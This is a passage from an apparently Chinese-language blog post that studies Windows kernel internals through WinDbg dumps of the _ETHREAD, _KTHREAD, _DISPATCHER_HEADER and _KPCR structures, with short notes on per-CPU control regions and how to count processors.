class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_ETHREAD</span><br><span class="line">   +0x000 Tcb              : _KTHREAD</span><br><span class="line">   +0x200 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x208 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x208 KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   +0x210 ExitStatus       : Int4B</span><br><span class="line">   +0x214 PostBlockList    : _LIST_ENTRY</span><br><span class="line">   +0x214 ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   +0x218 StartAddress     : Ptr32 Void</span><br><span class="line">   +0x21c TerminationPort  : Ptr32 _TERMINATION_PORT</span><br><span class="line">   +0x21c ReaperLink       : Ptr32 _ETHREAD</span><br><span class="line">   +0x21c KeyedWaitValue   : Ptr32 Void</span><br><span class="line">   +0x220 ActiveTimerListLock : Uint4B</span><br><span class="line">   +0x224 ActiveTimerListHead : _LIST_ENTRY</span><br><span class="line">   +0x22c Cid              : _CLIENT_ID</span><br><span class="line">   +0x234 KeyedWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x234 AlpcWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x248 ClientSecurity   : _PS_CLIENT_SECURITY_CONTEXT</span><br><span class="line">   +0x24c IrpList          : _LIST_ENTRY</span><br><span class="line">   +0x254 TopLevelIrp      : Uint4B</span><br><span class="line">   +0x258 DeviceToVerify   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +0x25c CpuQuotaApc      : Ptr32 _PSP_CPU_QUOTA_APC</span><br><span class="line">   +0x260 Win32StartAddress : Ptr32 Void</span><br><span class="line">   +0x264 LegacyPowerObject : Ptr32 Void</span><br><span class="line">   +0x268 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x270 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x274 ThreadLock       : _EX_PUSH_LOCK</span><br><span class="line">   +0x278 ReadClusterSize  : Uint4B</span><br><span class="line">   +0x27c MmLockOrdering   : Int4B</span><br><span class="line">   +0x280 CrossThreadFlags : Uint4B</span><br><span class="line">   +0x280 Terminated       : Pos 0, 1 Bit</span><br><span class="line">   +0x280 ThreadInserted   : Pos 1, 1 Bit</span><br><span class="line">   +0x280 HideFromDebugger : Pos 2, 1 Bit</span><br><span class="line">   +0x280 ActiveImpersonationInfo : Pos 3, 1 Bit</span><br><span class="line">   +0x280 Reserved         : Pos 4, 1 Bit</span><br><span class="line">   +0x280 HardErrorsAreDisabled : Pos 5, 1 Bit</span><br><span class="line">   +0x280 BreakOnTermination : Pos 6, 1 Bit</span><br><span class="line">   +0x280 SkipCreationMsg  : Pos 7, 1 Bit</span><br><span class="line">   +0x280 SkipTerminationMsg : Pos 8, 1 Bit</span><br><span class="line">   +0x280 CopyTokenOnOpen  : Pos 9, 1 Bit</span><br><span class="line">   +0x280 ThreadIoPriority : Pos 10, 3 Bits</span><br><span class="line">   +0x280 ThreadPagePriority : Pos 13, 3 Bits</span><br><span class="line">   +0x280 RundownFail      : Pos 16, 1 Bit</span><br><span class="line">   +0x280 NeedsWorkingSetAging : Pos 17, 1 Bit</span><br><span class="line">   +0x284 SameThreadPassiveFlags : Uint4B</span><br><span class="line">   +0x284 ActiveExWorker   : Pos 0, 1 Bit</span><br><span class="line">   +0x284 ExWorkerCanWaitUser : Pos 1, 1 Bit</span><br><span class="line">   +0x284 MemoryMaker      : Pos 2, 1 Bit</span><br><span class="line">   +0x284 ClonedThread     : Pos 3, 1 Bit</span><br><span class="line">   +0x284 KeyedEventInUse  : Pos 4, 1 Bit</span><br><span class="line">   +0x284 RateApcState     : Pos 5, 2 Bits</span><br><span class="line">   +0x284 SelfTerminate    : Pos 7, 1 Bit</span><br><span class="line">   +0x288 SameThreadApcFlags : Uint4B</span><br><span class="line">   +0x288 Spare            : Pos 0, 1 Bit</span><br><span class="line">   +0x288 StartAddressInvalid : Pos 1, 1 Bit</span><br><span class="line">   +0x288 EtwPageFaultCalloutActive : Pos 2, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetExclusive : Pos 3, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetShared : Pos 4, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetExclusive : Pos 5, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetShared : Pos 6, 1 Bit</span><br><span class="line">   +0x288 OwnsSessionWorkingSetExclusive : Pos 7, 1 Bit</span><br><span class="line">   +0x289 OwnsSessionWorkingSetShared : Pos 0, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceExclusive : Pos 1, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceShared : Pos 2, 1 Bit</span><br><span class="line">   +0x289 SuppressSymbolLoad : Pos 3, 1 Bit</span><br><span class="line">   +0x289 Prefetching      : Pos 4, 1 Bit</span><br><span class="line">   +0x289 OwnsDynamicMemoryShared : Pos 5, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaExclusive : Pos 6, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaShared : Pos 7, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetExclusive : Pos 0, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetShared : Pos 1, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetExclusive : Pos 2, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetShared : Pos 3, 1 Bit</span><br><span class="line">   +0x28a TrimTrigger      : Pos 4, 2 Bits</span><br><span class="line">   +0x28a Spare1           : Pos 6, 2 Bits</span><br><span class="line">   +0x28b PriorityRegionActive : UChar</span><br><span class="line">   +0x28c CacheManagerActive : UChar</span><br><span class="line">   +0x28d DisablePageFaultClustering : UChar</span><br><span class="line">   +0x28e ActiveFaultCount : UChar</span><br><span class="line">   +0x28f LockOrderState   : UChar</span><br><span class="line">   +0x290 AlpcMessageId    : Uint4B</span><br><span class="line">   +0x294 AlpcMessage      : Ptr32 Void</span><br><span class="line">   +0x294 AlpcReceiveAttributeSet : Uint4B</span><br><span class="line">   +0x298 AlpcWaitListEntry : _LIST_ENTRY</span><br><span class="line">   +0x2a0 CacheManagerCount : Uint4B</span><br><span class="line">   +0x2a4 IoBoostCount     : Uint4B</span><br><span class="line">   +0x2a8 IrpListLock      : Uint4B</span><br><span class="line">   +0x2ac ReservedForSynchTracking : Ptr32 Void</span><br><span class="line">   +0x2b0 CmCallbackListHead : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>上面的结构体有个相对比较重要的结构体，KTHREAD如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   上面这个可以拆解会用到03DebugActive</span><br><span class="line">   </span><br><span class="line">   kd&gt; dt _DISPATCHER_HEADER</span><br><span class="line">ntdll!_DISPATCHER_HEADER</span><br><span class="line">   +0x000 Type             : UChar</span><br><span class="line">   +0x001 TimerControlFlags : UChar</span><br><span class="line">   +0x001 Absolute         : Pos 0, 1 Bit</span><br><span class="line">   +0x001 Coalescable      : Pos 1, 1 Bit</span><br><span class="line">   +0x001 KeepShifting     : Pos 2, 1 Bit</span><br><span class="line">   +0x001 EncodedTolerableDelay : Pos 3, 5 Bits</span><br><span class="line">   +0x001 Abandoned        : UChar</span><br><span class="line">   +0x001 Signalling       : UChar</span><br><span class="line">   +0x002 ThreadControlFlags : UChar</span><br><span class="line">   +0x002 CpuThrottled     : Pos 0, 1 Bit</span><br><span class="line">   +0x002 CycleProfiling   : Pos 1, 1 Bit</span><br><span class="line">   +0x002 CounterProfiling : Pos 2, 1 Bit</span><br><span class="line">   +0x002 Reserved         : Pos 3, 5 Bits</span><br><span class="line">   +0x002 Hand             : UChar</span><br><span class="line">   +0x002 Size             : UChar</span><br><span class="line">   +0x003 TimerMiscFlags   : UChar</span><br><span class="line">   +0x003 Index            : Pos 0, 1 Bit</span><br><span class="line">   +0x003 Processor        : Pos 1, 5 Bits</span><br><span class="line">   +0x003 Inserted         : Pos 6, 1 Bit</span><br><span class="line">   +0x003 Expired          : Pos 7, 1 Bit</span><br><span class="line">   +0x003 DebugActive      : UChar</span><br><span class="line">   +0x003 ActiveDR7        : Pos 0, 1 Bit</span><br><span class="line">   +0x003 Instrumented     : Pos 1, 1 Bit</span><br><span class="line">   +0x003 Reserved2        : Pos 2, 4 Bits</span><br><span class="line">   +0x003 UmsScheduled     : Pos 6, 1 Bit</span><br><span class="line">   +0x003 UmsPrimary       : Pos 7, 1 Bit</span><br><span class="line">   +0x003 DpcActive        : UChar</span><br><span class="line">   +0x000 Lock             : Int4B</span><br><span class="line">   +0x004 SignalState      : Int4B</span><br><span class="line">   +0x008 WaitListHead     : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   +0x010 CycleTime        : Uint8B</span><br><span class="line">   +0x018 HighCycleTime    : Uint4B</span><br><span class="line">   +0x020 QuantumTarget    : Uint8B</span><br><span class="line">   +0x028 InitialStack     : Ptr32 Void</span><br><span class="line">   +0x02c StackLimit       : Ptr32 Void</span><br><span class="line">   +0x030 KernelStack      : Ptr32 Void</span><br><span class="line">   +0x034 ThreadLock       : Uint4B</span><br><span class="line">   +0x038 WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +0x039 Running          : UChar</span><br><span class="line">   +0x03a Alerted          : [2] UChar</span><br><span class="line">   +0x03c KernelStackResident : Pos 0, 1 Bit</span><br><span class="line">   +0x03c ReadyTransition  : Pos 1, 1 Bit</span><br><span class="line">   +0x03c ProcessReadyQueue : Pos 2, 1 Bit</span><br><span class="line">   +0x03c WaitNext         : Pos 3, 1 Bit</span><br><span class="line">   +0x03c SystemAffinityActive : Pos 4, 1 Bit</span><br><span class="line">   +0x03c Alertable        : Pos 5, 1 Bit</span><br><span class="line">   +0x03c GdiFlushActive   : Pos 6, 1 Bit</span><br><span class="line">   +0x03c UserStackWalkActive : Pos 7, 1 Bit</span><br><span class="line">   +0x03c ApcInterruptRequest : Pos 8, 1 Bit</span><br><span class="line">   +0x03c ForceDeferSchedule : Pos 9, 1 Bit</span><br><span class="line">   +0x03c QuantumEndMigrate : Pos 10, 1 Bit</span><br><span class="line">   +0x03c UmsDirectedSwitchEnable : Pos 11, 1 Bit</span><br><span class="line">   +0x03c TimerActive      : Pos 12, 1 Bit</span><br><span class="line">   +0x03c SystemThread     : Pos 13, 1 Bit</span><br><span class="line">   +0x03c Reserved         : Pos 14, 18 Bits</span><br><span class="line">   +0x03c MiscFlags        : Int4B</span><br><span class="line">   +0x040 ApcState         : _KAPC_STATE</span><br><span class="line">   +0x040 ApcStateFill     : [23] UChar</span><br><span class="line">   +0x057 Priority         : Char</span><br><span class="line">   +0x058 NextProcessor    : Uint4B</span><br><span class="line">   +0x05c DeferredProcessor : Uint4B</span><br><span class="line">   +0x060 ApcQueueLock     : Uint4B</span><br><span class="line">   +0x064 ContextSwitches  : Uint4B</span><br><span class="line">   +0x068 State            : UChar</span><br><span class="line">   +0x069 NpxState         : Char</span><br><span class="line">   +0x06a WaitIrql         : UChar</span><br><span class="line">   +0x06b WaitMode         : Char</span><br><span class="line">   +0x06c WaitStatus       : Int4B</span><br><span class="line">   +0x070 WaitBlockList    : Ptr32 _KWAIT_BLOCK</span><br><span class="line">   +0x074 WaitListEntry    : _LIST_ENTRY</span><br><span class="line">   +0x074 SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x07c Queue            : Ptr32 _KQUEUE</span><br><span class="line">   +0x080 WaitTime         : Uint4B</span><br><span class="line">   +0x084 KernelApcDisable : Int2B</span><br><span class="line">   +0x086 SpecialApcDisable : Int2B</span><br><span class="line">   +0x084 CombinedApcDisable : Uint4B</span><br><span class="line">   +0x088 Teb              : Ptr32 Void</span><br><span class="line">   +0x090 Timer            : _KTIMER</span><br><span class="line">   +0x0b8 AutoAlignment    : Pos 0, 1 Bit</span><br><span class="line">   +0x0b8 DisableBoost     : Pos 1, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc1Inserted : Pos 2, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc2Inserted : Pos 3, 1 Bit</span><br><span class="line">   +0x0b8 CalloutActive    : Pos 4, 1 Bit</span><br><span class="line">   +0x0b8 ApcQueueable     : Pos 5, 1 Bit</span><br><span class="line">   +0x0b8 EnableStackSwap  : Pos 6, 1 Bit</span><br><span class="line">   +0x0b8 GuiThread        : Pos 7, 1 Bit</span><br><span class="line">   +0x0b8 UmsPerformingSyscall : Pos 8, 1 Bit</span><br><span class="line">   +0x0b8 VdmSafe          : Pos 9, 1 Bit</span><br><span class="line">   +0x0b8 UmsDispatched    : Pos 10, 1 Bit</span><br><span class="line">   +0x0b8 ReservedFlags    : Pos 11, 21 Bits</span><br><span class="line">   +0x0b8 ThreadFlags      : Int4B</span><br><span class="line">   +0x0bc ServiceTable     : Ptr32 Void</span><br><span class="line">   +0x0c0 WaitBlock        : [4] _KWAIT_BLOCK</span><br><span class="line">   +0x120 QueueListEntry   : _LIST_ENTRY</span><br><span class="line">   +0x128 TrapFrame        : Ptr32 _KTRAP_FRAME</span><br><span class="line">   +0x12c FirstArgument    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackStack    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackDepth    : Uint4B</span><br><span class="line">   +0x134 ApcStateIndex    : UChar</span><br><span class="line">   +0x135 BasePriority     : Char</span><br><span class="line">   +0x136 PriorityDecrement : Char</span><br><span class="line">   +0x136 ForegroundBoost  : Pos 0, 4 Bits</span><br><span class="line">   +0x136 UnusualBoost     : Pos 4, 4 Bits</span><br><span class="line">   +0x137 Preempted        : UChar</span><br><span class="line">   +0x138 AdjustReason     : UChar</span><br><span class="line">   +0x139 AdjustIncrement  : Char</span><br><span class="line">   +0x13a PreviousMode     : Char</span><br><span class="line">   +0x13b Saturation       : Char</span><br><span class="line">   +0x13c SystemCallNumber : Uint4B</span><br><span class="line">   +0x140 FreezeCount      : Uint4B</span><br><span class="line">   +0x144 UserAffinity     : _GROUP_AFFINITY</span><br><span class="line">   +0x150 Process          : Ptr32 _KPROCESS</span><br><span class="line">   +0x154 Affinity         : _GROUP_AFFINITY</span><br><span class="line">   +0x160 IdealProcessor   : Uint4B</span><br><span class="line">   +0x164 UserIdealProcessor : Uint4B</span><br><span class="line">   +0x168 ApcStatePointer  : [2] Ptr32 _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcState    : _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcStateFill : [23] UChar</span><br><span class="line">   +0x187 WaitReason       : UChar</span><br><span class="line">   +0x188 SuspendCount     : Char</span><br><span class="line">   +0x189 Spare1           : Char</span><br><span class="line">   +0x18a OtherPlatformFill : UChar</span><br><span class="line">   +0x18c Win32Thread      : Ptr32 Void</span><br><span class="line">   +0x190 StackBase        : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApc       : _KAPC</span><br><span class="line">   +0x194 SuspendApcFill0  : [1] UChar</span><br><span class="line">   +0x195 ResourceIndex    : UChar</span><br><span class="line">   +0x194 SuspendApcFill1  : [3] UChar</span><br><span class="line">   +0x197 QuantumReset     : UChar</span><br><span class="line">   +0x194 SuspendApcFill2  : [4] UChar</span><br><span class="line">   +0x198 KernelTime       : Uint4B</span><br><span class="line">   +0x194 SuspendApcFill3  : [36] UChar</span><br><span class="line">   +0x1b8 WaitPrcb         : Ptr32 _KPRCB</span><br><span class="line">   +0x194 SuspendApcFill4  : [40] UChar</span><br><span class="line">   +0x1bc LegoData         : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApcFill5  : [47] UChar</span><br><span class="line">   +0x1c3 LargeStack       : UChar</span><br><span class="line">   +0x1c4 UserTime         : Uint4B</span><br><span class="line">   +0x1c8 SuspendSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x1c8 SuspendSemaphorefill : [20] UChar</span><br><span class="line">   +0x1dc SListFaultCount  : Uint4B</span><br><span class="line">   +0x1e0 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x1e8 MutantListHead   : _LIST_ENTRY</span><br><span class="line">   +0x1f0 SListFaultAddress : Ptr32 Void</span><br><span class="line">   +0x1f4 ThreadCounters   : Ptr32 _KTHREAD_COUNTERS</span><br><span class="line">   +0x1f8 XStateSave       : Ptr32 _XSTATE_SAVE</span><br></pre></td></tr></table></figure><p>线程有一个结构体描述他的状态如上，CPU也有是PCR<br>即CPU控制区（Process Control Region）<br>CPU也有自己的控制块，每一个CPU有一个，叫KPCR，有几个核就几个<br>查看CPU数量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors</span><br><span class="line">83f6c96c  00000001 83ef8f33 00000002 00000001</span><br><span class="line">83f6c97c  00000000 00000000 00000020 1fc10000</span><br><span class="line">83f6c98c  00110006 00003c03 77ab7058 77ab6f58</span><br><span class="line">83f6c99c  77ab6fc0 77ab7008 77aa5a8f 77aa5a8d</span><br><span class="line">83f6c9ac  77aa5a64 00000000 00c671e3 841c55b0</span><br><span class="line">83f6c9bc  8412f4f2 83e80d9c 00000000 00000191</span><br><span class="line">83f6c9cc  83e813e4 00000000 00000000 00000000</span><br><span class="line">83f6c9dc  00000000 83edf6af 00000000 025355a9</span><br></pre></td></tr></table></figure><p>还可以通过下面命令查看当前的KPCR存在哪，有几核就几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KiProcessorBlock L8//显示一个说明单核</span><br><span class="line">83f6c8c0  83f2dd20 00000000 00000000 00000000</span><br><span class="line">83f6c8d0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">dt _KPCR</span><br><span class="line">ntdll!_KPCR</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 Used_StackBase   : Ptr32 Void</span><br><span class="line">   +0x008 Spare2           : Ptr32 Void</span><br><span class="line">   +0x00c TssCopy          : Ptr32 Void</span><br><span class="line">   +0x010 ContextSwitches  : Uint4B</span><br><span class="line">   +0x014 SetMemberCopy    : Uint4B</span><br><span class="line">   +0x018 Used_Self        : Ptr32 Void</span><br><span class="line">   +0x01c SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +0x020 Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +0x024 Irql             : UChar</span><br><span class="line">   +0x028 IRR              : Uint4B</span><br><span class="line">   +0x02c IrrActive        : Uint4B</span><br><span class="line">   +0x030 IDR              : Uint4B</span><br><span class="line">   +0x034 KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +0x038 IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +0x03c GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +0x040 TSS              : Ptr32 _KTSS</span><br><span class="line">   +0x044 MajorVersion     : Uint2B</span><br><span class="line">   +0x046 MinorVersion     : Uint2B</span><br><span class="line">   +0x048 SetMember        : Uint4B</span><br><span class="line">   +0x04c StallScaleFactor : Uint4B</span><br><span class="line">   +0x050 SpareUnused      : UChar</span><br><span class="line">   +0x051 Number           : UChar</span><br><span class="line">   +0x052 Spare0           : UChar</span><br><span class="line">   +0x053 SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +0x054 VdmAlert         : Uint4B</span><br><span class="line">   +0x058 KernelReserved   : [14] Uint4B</span><br><span class="line">   +0x090 SecondLevelCacheSize : Uint4B</span><br><span class="line">   +0x094 HalReserved      : [16] Uint4B</span><br><span class="line">   +0x0d4 InterruptMode    : Uint4B</span><br><span class="line">   +0x0d8 Spare1           : UChar</span><br><span class="line">   +0x0dc KernelReserved2  : [17] Uint4B</span><br><span class="line">   +0x120 PrcbData         : _KPRCB</span><br></pre></td></tr></table></figure><p>最后一个_KPRCB结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span 